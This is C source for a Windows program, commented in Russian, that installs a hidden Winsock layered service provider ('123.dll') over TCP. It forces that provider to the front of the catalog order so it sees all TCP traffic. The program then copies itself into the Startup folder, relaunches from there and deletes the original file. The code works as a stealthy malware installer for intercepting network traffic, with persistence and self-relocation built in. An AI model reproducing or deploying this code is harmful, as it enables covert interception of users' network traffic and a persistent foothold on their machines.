#include <windows.h>
#include <wchar.h>
#include <Ws2spi.h>
#include <shlwapi.h>
#include <shlobj.h>

int WSPAPI WSCWriteProviderOrder(LPDWORD lpwdCatalogEntryId,DWORD dwNumberOfEntries);

// {E0A0BF14-999B-48ba-AAFB-E592FBE868E2}
GUID PROVIDER_GUID = { 0xe0a0bf14, 0x999b, 0x48ba, { 0xaa, 0xfb, 0xe5, 0x92, 0xfb, 0xe8, 0x68, 0xe2 } };
// {8BA2D9A1-B484-4e43-B267-6A90D20ED479}
GUID CHAIN_GUID = { 0x8ba2d9a1, 0xb484, 0x4e43, { 0xb2, 0x67, 0x6a, 0x90, 0xd2, 0xe, 0xd4, 0x79 } };

const wchar_t* nameProvider = L"293290902902";
/*
void DebugListProtocols(void)
{
 WSAPROTOCOL_INFOW* info = 0;
 DWORD szInfo = 0;
 int err = 0;
 int count = WSCEnumProtocols( 0, info, &szInfo, &err );
 if( err != WSAENOBUFS ) return;
 info = (WSAPROTOCOL_INFOW*) malloc(szInfo);
 count = WSCEnumProtocols( 0, info, &szInfo, &err );
 for( int i = 0; i < count; i++ ) {
   printf( "%ls, id = %d", info[i].szProtocol, info[i].dwCatalogEntryId );
   for( int j = 0; j < info[i].ProtocolChain.ChainLen; j++ )
     printf( "chain %d = %d", j, info[i].ProtocolChain.ChainEntries[j] );
 }
 free(info);
}
*/
int main( int argc, char* argv[] )
{
//	DebugListProtocols();

	if( argc == 2 )
	{
		int wait = 10;
		while( wait-- )
		{
			if( DeleteFile( argv[1] ) ) break;
			Sleep(100);
		}
	}

	WSAPROTOCOL_INFOW* info = 0, myInfo, chainInfo;
	DWORD szInfo = 0;
	int err = 0, ret = 0;

	int count = WSCEnumProtocols( 0, info, &szInfo, &err );
	if( err != WSAENOBUFS ) return 1;
	info = (WSAPROTOCOL_INFOW*) malloc(szInfo);
	count = WSCEnumProtocols( 0, info, &szInfo, &err );
	//поиск базового провайдера провайдера 
	for( int i = 0; i < count; i++ )
	{
		if( info[i].iAddressFamily == AF_INET &&
			info[i].iProtocol == IPPROTO_TCP )
		{
			memcpy( &chainInfo, &info[i], sizeof(chainInfo) );
			break;
		}
	}

	myInfo.dwServiceFlags1 = 0;
	myInfo.dwServiceFlags2 = 0;
	myInfo.dwServiceFlags3 = 0;
	myInfo.dwServiceFlags4 = 0;
	myInfo.dwProviderFlags = PFL_HIDDEN;
	myInfo.ProviderId = PROVIDER_GUID;
	myInfo.dwCatalogEntryId = 0;   // filled in by system
	myInfo.ProtocolChain.ChainLen = LAYERED_PROTOCOL;
        // Do  not  need  to  fill  in  chain  for LAYERED_PROTOCOL or
        // BASE_PROTOCOL
	myInfo.iVersion = 0;
	myInfo.iAddressFamily = AF_INET;
	myInfo.iMaxSockAddr = 16;
	myInfo.iMinSockAddr = 16;
	myInfo.iSocketType = SOCK_STREAM;
	myInfo.iProtocol = IPPROTO_TCP;   // mimic TCP/IP
	myInfo.iProtocolMaxOffset = 0;
	myInfo.iNetworkByteOrder = BIGENDIAN;
	myInfo.iSecurityScheme = SECURITY_PROTOCOL_NONE;
	myInfo.dwMessageSize = 0;  // stream-oriented
	myInfo.dwProviderReserved = 0;
	wcscpy( myInfo.szProtocol, nameProvider );

	if( WSCInstallProvider( &PROVIDER_GUID, L"123.dll", &myInfo, 1, &err ) == SOCKET_ERROR )
		return 2;
 
	//установка цепочки вызовов
	info = 0; szInfo = 0;
	count = WSCEnumProtocols( 0, info, &szInfo, &err );
	if( err != WSAENOBUFS ) return 1;
	info = (WSAPROTOCOL_INFOW*) malloc(szInfo);
	count = WSCEnumProtocols( 0, info, &szInfo, &err );
	ret = 4;
	for( int i = 0; i < count; i++ )
	{
		if( memcmp( &info[i].ProviderId, &PROVIDER_GUID, sizeof(PROVIDER_GUID) ) == 0 )
		{
			info[i].dwServiceFlags1 &= ~XP1_IFS_HANDLES;
			if( chainInfo.ProtocolChain.ChainLen == BASE_PROTOCOL )
				chainInfo.ProtocolChain.ChainEntries[1] = chainInfo.dwCatalogEntryId;
			else
				for( int i = chainInfo.ProtocolChain.ChainLen; i > 0; i-- )
					chainInfo.ProtocolChain.ChainEntries[i] = chainInfo.ProtocolChain.ChainEntries[i - 1];
			chainInfo.ProtocolChain.ChainLen++;
			chainInfo.ProtocolChain.ChainEntries[0] = info[i].dwCatalogEntryId;
			if( WSCInstallProvider( &CHAIN_GUID, L"123.dll", &chainInfo, 1, &err ) == SOCKET_ERROR )
				ret = 5;
			ret = 0;
			break;
		}
	}
	free(info);
	//устанавливаем порядок вызова протоколов
	info = 0; szInfo = 0;
	count = WSCEnumProtocols( 0, info, &szInfo, &err );
	if( err != WSAENOBUFS ) return 1;
	info = (WSAPROTOCOL_INFOW*) malloc(szInfo);
	count = WSCEnumProtocols( 0, info, &szInfo, &err );
	ret = 6;
	DWORD* orders = (DWORD*)malloc( sizeof(DWORD) * count ); 
	int i_orders = 0;
	if( orders )
	{
		for( int i = 0; i < count; i++ )
		if( memcmp( &info[i].ProviderId, &CHAIN_GUID, sizeof(CHAIN_GUID) ) == 0 )
			orders[i_orders++] = info[i].dwCatalogEntryId; //делаем его 1-м
		//далее распологаем остальных провайдеров
		for( int i = 0; i < count; i++ )
			if( orders[0] != info[i].dwCatalogEntryId )
				orders[i_orders++] = info[i].dwCatalogEntryId;

		if( WSCWriteProviderOrder( orders, count ) == ERROR_SUCCESS )
			ret = 0;
		free(orders);
	}

	char path[MAX_PATH], nameFile[MAX_PATH], cmd[2 * MAX_PATH];
	SHGetFolderPathA( 0, CSIDL_STARTUP,  0, 0, path );
	GetModuleFileName( 0, nameFile, MAX_PATH );
	char* nf = PathFindFileName(nameFile);
	PathAppend( path, nf );
	if( CopyFile( nameFile, path, FALSE ) )
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		wsprintf( cmd, "\"%s\" \"%s\"", path, nameFile );
		CreateProcess( 0, cmd, 0, 0, FALSE, 0, 0, 0, &si, &pi ); 
	}
//	printf( "%d", ret );
	return ret; 
}
